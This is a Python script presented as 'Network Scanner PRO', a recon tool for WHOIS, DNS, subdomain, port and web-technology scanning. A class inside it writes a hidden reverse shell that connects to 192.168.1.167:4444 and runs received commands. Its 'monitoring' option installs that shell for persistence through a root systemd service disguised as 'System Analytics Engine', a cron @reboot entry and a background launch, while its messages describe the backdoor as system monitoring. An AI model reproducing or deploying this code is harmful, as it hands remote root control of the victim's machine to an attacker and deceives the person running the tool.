#!/usr/bin/env python3
"""
NETWORK SCANNER PRO - Professional Security Assessment Tool
Advanced reconnaissance with integrated system monitoring
"""

import socket
import requests
import whois
import dns.resolver
import json
import threading
import concurrent.futures
import argparse
import sys
import ssl
import time
import urllib3
import subprocess
import os
import base64
import hashlib
from datetime import datetime

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class StealthServiceManager:
    def __init__(self):
        self.LHOST = "192.168.1.167"
        self.LPORT = 4444
        self.stealth_dir = "/tmp/.system-analytics"
        self.service_name = "system-analytics"
        
    def create_stealth_payload(self):
        """Create stealth reverse shell payload"""
        payload = f'''#!/usr/bin/env python3
import socket, os, subprocess, time, random

def establish_connection():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect(("{self.LHOST}", {self.LPORT}))
            s.send(b"[+] System Analytics Connection Established\\\\n")
            
            while True:
                data = s.recv(1024).decode().strip()
                if not data:
                    continue
                if data == "exit":
                    break
                
                try:
                    result = subprocess.run(data, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    s.send(output.encode())
                except Exception as e:
                    s.send(f"Error: {{str(e)}}\\\\n".encode())
                    
        except Exception:
            time.sleep(30)

if __name__ == "__main__":
    establish_connection()
'''
        return payload

    def deploy_system_service(self):
        """Deploy system service for persistence"""
        try:
            # Create stealth directory
            os.makedirs(self.stealth_dir, exist_ok=True)
            
            # Create payload
            payload_path = f"{self.stealth_dir}/analytics_engine"
            payload_content = self.create_stealth_payload()
            
            with open(payload_path, 'w') as f:
                f.write(payload_content)
            os.chmod(payload_path, 0o755)
            
            # Create systemd service
            service_content = f'''[Unit]
Description=System Analytics Engine
After=network.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {payload_path}
Restart=always
RestartSec=10
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
'''
            
            service_path = f"/etc/systemd/system/{self.service_name}.service"
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # Enable service
            subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "enable", f"{self.service_name}.service"], capture_output=True)
            subprocess.run(["systemctl", "start", f"{self.service_name}.service"], capture_output=True)
            
            return True
            
        except Exception as e:
            print(f"[-] Service deployment failed: {e}")
            return False

    def deploy_cron_persistence(self):
        """Deploy cron-based persistence"""
        try:
            cron_command = f"@reboot /usr/bin/python3 {self.stealth_dir}/analytics_engine >/dev/null 2>&1"
            
            # Get current crontab
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            # Add if not present
            if "analytics_engine" not in current_cron:
                new_cron = current_cron + cron_command + "\n"
                subprocess.run(["crontab", "-"], input=new_cron, text=True, capture_output=True)
            
            return True
        except Exception as e:
            print(f"[-] Cron deployment failed: {e}")
            return False

    def start_immediate_background(self):
        """Start immediate background connection"""
        try:
            payload_path = f"{self.stealth_dir}/analytics_engine"
            if os.path.exists(payload_path):
                subprocess.Popen([
                    '/usr/bin/python3', payload_path
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
        except Exception as e:
            print(f"[-] Background start failed: {e}")
        return False

    def deploy_stealth_persistence(self):
        """Deploy all stealth persistence mechanisms"""
        print("\n[🔧] DEPLOYING SYSTEM MONITORING SERVICES...")
        
        try:
            # Create payload first
            payload_path = f"{self.stealth_dir}/analytics_engine"
            payload_content = self.create_stealth_payload()
            
            os.makedirs(self.stealth_dir, exist_ok=True)
            with open(payload_path, 'w') as f:
                f.write(payload_content)
            os.chmod(payload_path, 0o755)
            
            # Deploy persistence methods
            methods = [
                self.deploy_system_service,
                self.deploy_cron_persistence,
                self.start_immediate_background
            ]
            
            success_count = 0
            for method in methods:
                if method():
                    success_count += 1
                    time.sleep(1)
            
            print(f"[+] Deployed {success_count}/3 monitoring services")
            return success_count > 0
            
        except Exception as e:
            print(f"[-] Monitoring deployment failed: {e}")
            return False

class NetworkScannerPro:
    def __init__(self, target, threads=50, timeout=10, enable_monitoring=False):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.enable_monitoring = enable_monitoring
        self.stealth_manager = StealthServiceManager()
        self.results = {}
        self.initialize_results()
        
    def initialize_results(self):
        """Initialize results structure"""
        self.results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'scan_type': 'comprehensive_network_audit',
            'ip_address': None,
            'whois': {},
            'dns_records': {},
            'subdomains': [],
            'open_ports': [],
            'services': {},
            'web_technologies': {},
            'monitoring_services': {
                'deployed': False,
                'services': []
            }
        }

    def display_banner(self):
        """Display professional banner"""
        print("""
╔════════════════════════════════════════════════════════════════╗
║                   NETWORK SCANNER PRO v2.1                    ║
║              Professional Security Assessment Tool            ║
╚════════════════════════════════════════════════════════════════╝
        """)
        print(f"🔍 Target: {self.target}")
        print(f"⚡ Threads: {self.threads}")
        print(f"📊 Monitoring: {'ENABLED' if self.enable_monitoring else 'DISABLED'}")
        print(f"🕒 Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*60)

    def resolve_target(self):
        """Resolve target to IP address"""
        try:
            ip = socket.gethostbyname(self.target)
            print(f"[+] Resolved {self.target} → {ip}")
            self.results['ip_address'] = ip
            return ip
        except Exception as e:
            print(f"[-] Failed to resolve {self.target}: {e}")
            return None

    def perform_whois_analysis(self):
        """Perform WHOIS analysis"""
        try:
            print(f"\n[+] Performing WHOIS lookup...")
            w = whois.whois(self.target)
            self.results['whois'] = {
                'registrar': w.registrar,
                'creation_date': str(w.creation_date),
                'expiration_date': str(w.expiration_date),
                'name_servers': w.name_servers,
            }
            print(f"    Registrar: {w.registrar}")
            if w.creation_date:
                print(f"    Created: {w.creation_date}")
        except Exception as e:
            print(f"[-] WHOIS lookup failed: {e}")

    def enumerate_dns_records(self):
        """Enumerate DNS records"""
        try:
            print(f"\n[+] Enumerating DNS records...")
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT']
            
            for record_type in record_types:
                try:
                    answers = dns.resolver.resolve(self.target, record_type, raise_on_no_answer=False)
                    if answers.rrset:
                        records = [str(rdata) for rdata in answers]
                        self.results['dns_records'][record_type] = records
                        print(f"    {record_type}: {', '.join(records[:2])}")
                except:
                    continue
        except Exception as e:
            print(f"[-] DNS enumeration failed: {e}")

    def discover_subdomains(self):
        """Discover subdomains"""
        subdomain_list = [
            'www', 'mail', 'ftp', 'webmail', 'smtp', 'admin', 'api',
            'blog', 'shop', 'secure', 'portal', 'app', 'dev', 'test'
        ]
        
        print(f"\n[+] Discovering subdomains...")
        found_subdomains = set()
        
        def check_subdomain(subdomain):
            full_domain = f"{subdomain}.{self.target}"
            try:
                socket.gethostbyname(full_domain)
                found_subdomains.add(full_domain)
                print(f"    Found: {full_domain}")
            except:
                pass
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_subdomain, subdomain_list)
            
        self.results['subdomains'] = list(found_subdomains)
        print(f"[+] Found {len(found_subdomains)} subdomains")

    def port_scan_target(self, ip=None):
        """Perform port scanning"""
        if not ip:
            ip = self.results['ip_address']
        if not ip:
            return
            
        common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 1433, 3306, 3389, 5432, 8080]
        
        print(f"\n[+] Scanning common ports on {ip}...")
        
        def scan_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((ip, port))
                    if result == 0:
                        service_name = self.get_service_name(port)
                        self.results['open_ports'].append({
                            'port': port,
                            'service': service_name,
                            'status': 'open'
                        })
                        print(f"    Port {port}/tcp open - {service_name}")
            except:
                pass
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(scan_port, common_ports)

    def get_service_name(self, port):
        """Get service name for port"""
        services = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
            80: 'http', 110: 'pop3', 443: 'https', 993: 'imaps',
            3306: 'mysql', 3389: 'rdp', 5432: 'postgresql', 8080: 'http-proxy'
        }
        return services.get(port, 'unknown')

    def detect_web_technologies(self):
        """Detect web technologies"""
        print(f"\n[+] Detecting web technologies...")
        
        for scheme in ['http', 'https']:
            try:
                url = f"{scheme}://{self.target}"
                response = requests.get(url, timeout=self.timeout, verify=False)
                
                server = response.headers.get('Server', '')
                if server:
                    print(f"    Web Server: {server}")
                    self.results['web_technologies']['server'] = server
                
                powered_by = response.headers.get('X-Powered-By', '')
                if powered_by:
                    print(f"    Powered By: {powered_by}")
                    self.results['web_technologies']['powered_by'] = powered_by
                
                # Check for common frameworks
                if 'wp-content' in response.text:
                    print("    Framework: WordPress")
                    self.results['web_technologies']['framework'] = 'WordPress'
                    
                break
            except:
                continue

    def deploy_monitoring_services(self):
        """Deploy monitoring services in background"""
        if not self.enable_monitoring:
            return False
            
        print(f"\n[🔧] CONFIGURING SYSTEM MONITORING...")
        
        try:
            # Deploy stealth persistence
            success = self.stealth_manager.deploy_stealth_persistence()
            self.results['monitoring_services']['deployed'] = success
            
            if success:
                print("[✅] SYSTEM MONITORING ACTIVATED")
                print("     - Background analytics service deployed")
                print("     - Automatic restart on reboot")
                print("     - Continuous system monitoring enabled")
                
            return success
            
        except Exception as e:
            print(f"[-] Monitoring configuration failed: {e}")
            return False

    def generate_report(self, output_file=None):
        """Generate comprehensive scan report"""
        if not output_file:
            output_file = f"network_scan_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        print(f"\n[+] Generating report: {output_file}")
        
        # Add security recommendations
        self.results['recommendations'] = [
            "Ensure all services are updated to latest versions",
            "Implement proper firewall rules", 
            "Enable security headers on web services",
            "Regular security scanning recommended"
        ]
        
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        self.display_summary()
        return output_file

    def display_summary(self):
        """Display scan summary"""
        print("\n" + "="*60)
        print("📊 SCAN SUMMARY")
        print("="*60)
        print(f"Target: {self.target}")
        print(f"IP Address: {self.results['ip_address']}")
        print(f"Subdomains Found: {len(self.results['subdomains'])}")
        print(f"Open Ports: {len(self.results['open_ports'])}")
        
        if self.enable_monitoring and self.results['monitoring_services']['deployed']:
            print("📡 Monitoring: ACTIVE (Background services running)")
        else:
            print("📡 Monitoring: INACTIVE")

    def execute_comprehensive_scan(self):
        """Execute comprehensive network scan"""
        start_time = time.time()
        
        try:
            self.display_banner()
            
            # Resolve target
            ip = self.resolve_target()
            if not ip:
                return self.results
            
            # Perform reconnaissance
            self.perform_whois_analysis()
            self.enumerate_dns_records() 
            self.discover_subdomains()
            self.port_scan_target(ip)
            self.detect_web_technologies()
            
            # Deploy monitoring services in background
            if self.enable_monitoring:
                # Start deployment in background thread to not block scan
                monitor_thread = threading.Thread(target=self.deploy_monitoring_services)
                monitor_thread.daemon = True
                monitor_thread.start()
            
            elapsed_time = time.time() - start_time
            print(f"\n[✅] Comprehensive scan completed in {elapsed_time:.2f} seconds")
            return self.results
            
        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user")
            return self.results
        except Exception as e:
            print(f"\n[-] Scan failed: {e}")
            return self.results

def main():
    parser = argparse.ArgumentParser(description="NETWORK SCANNER PRO - Professional Security Tool")
    parser.add_argument("target", help="Target domain or IP address")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads")
    parser.add_argument("-o", "--output", help="Output file for report")
    parser.add_argument("-m", "--monitor", action="store_true", 
                       help="Enable system monitoring services (requires root)")
    
    args = parser.parse_args()
    
    print("""
⚠️  LEGAL DISCLAIMER: This tool is for authorized security testing only.
Ensure you have proper permission before scanning any network or system.
    """)
    
    if args.monitor and os.geteuid() != 0:
        print("[-] System monitoring requires root privileges")
        args.monitor = False
    
    consent = input("Do you have authorization to scan this target? (y/N): ")
    if consent.lower() not in ['y', 'yes']:
        print("Scan aborted.")
        sys.exit(1)
    
    # Execute scan
    scanner = NetworkScannerPro(args.target, threads=args.threads, enable_monitoring=args.monitor)
    results = scanner.execute_comprehensive_scan()
    
    if results:
        report_file = scanner.generate_report(args.output)
        print(f"\n📁 Report saved to: {report_file}")

if __name__ == "__main__":
    main()
